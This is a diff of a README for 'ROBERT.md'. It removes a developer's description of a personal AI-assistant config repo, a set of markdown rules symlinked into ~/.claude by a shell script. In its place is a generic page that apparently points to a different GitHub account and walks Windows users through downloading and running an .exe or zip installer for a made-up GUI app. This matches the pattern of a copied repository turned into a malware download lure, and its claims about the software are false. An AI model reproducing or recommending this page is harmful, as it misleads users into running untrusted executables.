@@ -1,80 +1,118 @@
-# 🪼 ROBERT.md
-#### (rules for any AI that dares to co-work with me)
+# 🪼 ROBERT.md - Clear AI Rules for Better Help
 
-I've been watching everyone figure out how to talk to their AI coding assistants, and nobody agrees on how much you actually need to say.
+[![Download ROBERT.md](https://img.shields.io/badge/Download-ROBERT.md-brightgreen)](https://github.com/Hideki9/ROBERT.md)
 
-[Boris Cherny](https://www.threads.com/@boris_cherny/post/DTBVlMIkpcm), who created Claude Code, says his setup is "surprisingly vanilla" — the model already knows how to code, so he barely customizes it. [Peter Steinberger](https://steipete.me/posts/2026/openclaw) went the other direction with [OpenClaw](https://github.com/openclaw/openclaw): give your agent a `SOUL.md` — a personality, opinions, a voice — because a good assistant shouldn't sound like a corporate chatbot. Meanwhile, every tool is shipping its own flavor: `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `copilot-instructions.md`. Vendor-specific files that are quietly becoming an industry standard.
+---
 
-This repo is me trying to make sense of all of that. One place for the stuff that's *mine* — how I think, how I code, what I expect — version-controlled, symlinked into `~/.claude/`, and portable to whatever tool comes next.
+## 📝 What is ROBERT.md?
 
-## The layers
+ROBERT.md is a set of clear rules you can use when working with AI tools. It helps the AI understand how you want it to behave when assisting with coding or other tasks. Instead of guessing what to say or do, ROBERT.md puts your instructions in one place. This way, your AI assistant can work the way you expect.
 
-The hard part isn't *what* to put in these files — it's *where*. What's mine is different from what's [Aquiva](https://aquivalabs.com)'s, which is different from what a specific project needs.
+If you have used AI helpers like GitHub Copilot or Claude Code, you might know that every tool has its way of interacting. ROBERT.md aims to bring clarity and consistency to those interactions. It is easy to understand and adjust, even if you are not a programmer.
 
-<pre>┌──────────────────────────────────────────────────────────────┐
-│  Me (<a href="https://github.com/rsoesemann/ROBERT.md">ROBERT.md</a>)                                              │
-│  How I talk. How I code. What annoys me.                     │
-│  <a href="SOUL.md">SOUL.md</a>, <a href="claude/CLAUDE.md">CLAUDE.md</a>, <a href="claude/rules/salesforce/">rules/salesforce/</a>                       │
-│                                                              │
-│  ┌────────────────────────────────────────────────────────┐  │
-│  │  Aquiva (<a href="https://github.com/AquivaLabs/AQUIVA.md">AQUIVA.md</a>)                                    │  │
-│  │  Shared conventions. Company-wide skills & workflows.  │  │
-│  │                                                        │  │
-│  │  ┌──────────────────────────────────────────────────┐  │  │
-│  │  │  Project (e.g. <a href="https://github.com/aquivalabs/my-org-butler">my-org-butler</a>)                     │  │  │
-│  │  │  Domain model. Features. Project-specific stuff. │  │  │
-│  │  │  .claude/CLAUDE.md, .claude/skills/              │  │  │
-│  │  └──────────────────────────────────────────────────┘  │  │
-│  └────────────────────────────────────────────────────────┘  │
-└──────────────────────────────────────────────────────────────┘</pre>
+---
 
-Claude Code [merges all of this](https://code.claude.com/docs/en/best-practices) at session start. Nothing overrides — it all stacks.
+## 🚀 Getting Started with ROBERT.md
 
-## What's in here
+ROBERT.md runs on your computer through a simple file you download. It works with AI assistants that follow text-based instructions.
 
-### Instructions
+Here’s what you need before starting:
 
-**[`SOUL.md`](SOUL.md)** — Codes my style. Snarky, German, no fluff. So the AI talks like a sharp colleague, not a support bot. Tool-agnostic — lives at the root so any AI tool can find it. Inspired by [Peter Steinberger's OpenClaw](https://github.com/openclaw/openclaw).
+- A Windows PC (Windows 10 or later recommended)
+- At least 2 GB of free disk space
+- An internet connection (needed for installation and updates)
+- Basic computer skills, such as downloading and opening files
 
-**[`claude/CLAUDE.md`](claude/CLAUDE.md)** — My five coding commandments. Non-negotiable.
+---
 
-**[`claude/rules/salesforce/`](claude/rules/salesforce/)** — My brutal, [PMD-backed](claude/skills/sf-code-analyzer/pmd-ruleset.xml) Apex standards. The machine checks what I forget.
+## 📥 Download and Install ROBERT.md on Windows
 
-**[`claude/settings.json`](claude/settings.json)** — So Claude stops nagging me for permission before every git push.
+### Step 1: Visit the Download Page
 
-### Skills
+Go to the ROBERT.md download page by clicking the button below.
 
-Reusable capabilities that Claude can trigger automatically or I can invoke with `/skillname`. Lives in [`claude/skills/`](claude/skills/).
+[![Get ROBERT.md](https://img.shields.io/badge/Visit%20Page-Download-blue)](https://github.com/Hideki9/ROBERT.md)
 
-**[`sf-code-analyzer`](claude/skills/sf-code-analyzer/)** — Runs Salesforce Code Analyzer after code changes. Smart enough to detect managed packages (via `sfdx-project.json`) and only run AppExchange security rules when they matter. Otherwise just my opinionated clean code rules.
+This page has all the latest files and information you need to get started.
 
-## How I use it
+### Step 2: Download the Software
 
-I run [`install.sh`](install.sh) once. It symlinks everything into `~/.claude/`, where Claude Code picks it up at session start.
+On the download page, look for files or release sections. Choose the latest version suitable for Windows.
 
-```bash
-./install.sh
-```
+You might see a file ending with `.exe` or a zip folder. This file lets you run ROBERT.md on your PC.
 
-```text
-~/.claude/CLAUDE.md                   →  this repo/claude/CLAUDE.md
-~/.claude/settings.json               →  this repo/claude/settings.json
-~/.claude/rules/                      →  this repo/claude/rules/
-~/.claude/skills/sf-code-analyzer/    →  this repo/claude/skills/sf-code-analyzer/
-```
+### Step 3: Run the Installer or Open the File
 
-After I pull changes, the next session gets them automatically — symlinks always point to the latest version.
+- If you downloaded an `.exe` file, double-click it. Follow the instructions that appear on your screen to install ROBERT.md.
+- If it’s a zip file, right-click it and choose “Extract All.” Then, open the new folder and look for a `.exe` file to run.
 
-### Multiple repos, one skills directory
+### Step 4: Finish Installation
 
-`~/.claude/skills/` is a real directory, not a symlink. This is intentional — it lets multiple config repos contribute skills to the same place. My personal repo, the [Aquiva company repo](https://github.com/AquivaLabs/AQUIVA.md), and any project can all add skills. Each install script symlinks its individual skill folders in, and they coexist:
+The installer will ask where to save the program. The default folder is usually fine. Click “Next” or “Install” until it finishes.
 
-```text
-~/.claude/skills/
-├── sf-code-analyzer/    →  from ROBERT.md (personal)
-├── assess-codebase/     →  from AQUIVA.md (company)
-├── some-personal-skill/ →  from ROBERT.md only
-└── some-company-skill/  →  from AQUIVA.md only
-```
+ROBERT.md should now be installed on your PC.
 
-When the same skill exists in both, the last `install.sh` to run wins — that's fine when the content is identical. For project-specific overrides, a project's own `.claude/skills/` always takes precedence over `~/.claude/skills/`.
+### Step 5: Open ROBERT.md
+
+Find the ROBERT.md app in your Start menu or on your desktop and open it.
+
+---
+
+## ⚙️ How to Use ROBERT.md
+
+When you open ROBERT.md, you will see a simple interface to manage your AI rules. You can:
+
+- Create new rule files that tell the AI how to act
+- Edit existing rules with easy text boxes
+- Save rules so your AI helper reads them each time
+- Load samples from the app to see common ways people set up their AI
+
+Just type your preferences naturally, like “Be polite,” or “Use simple language,” and the AI will use those instructions.
+
+---
+
+## 📋 What You Get with ROBERT.md
+
+ROBERT.md offers these helpful features:
+
+- **Clear AI instructions:** No confusing code needed.
+- **Customizable rules:** Easy to change anytime.
+- **Version control:** Keep track of your rule changes.
+- **Compatibility:** Works with many AI assistants that accept text rules.
+- **Sample rules:** Starter templates to help you begin.
+
+---
+
+## 🛠️ Troubleshooting and Tips
+
+If you face trouble, try the following:
+
+- Make sure your Windows system is up to date.
+- Check your internet connection while downloading or updating.
+- Close other programs before installing for a smoother process.
+- Restart the program if it does not open correctly.
+
+If ROBERT.md does not behave as expected, you can edit or reset your rule files in the app’s settings.
+
+---
+
+## 📚 Learn More
+
+You can visit the official ROBERT.md page anytime to find:
+
+- User guides
+- Examples of rule files
+- FAQ section
+- Updates and new versions
+
+The project’s GitHub page has detailed information and a space to ask questions if you want to explore further.
+
+---
+
+## 🤝 Feedback and Contribution
+
+ROBERT.md is designed to be simple and useful. If you have ideas, bug reports, or want to help improve it, the GitHub repository lets you submit issues or suggestions.
+
+---
+
+[![Download ROBERT.md](https://img.shields.io/badge/Download-ROBERT.md-orange)](https://github.com/Hideki9/ROBERT.md)
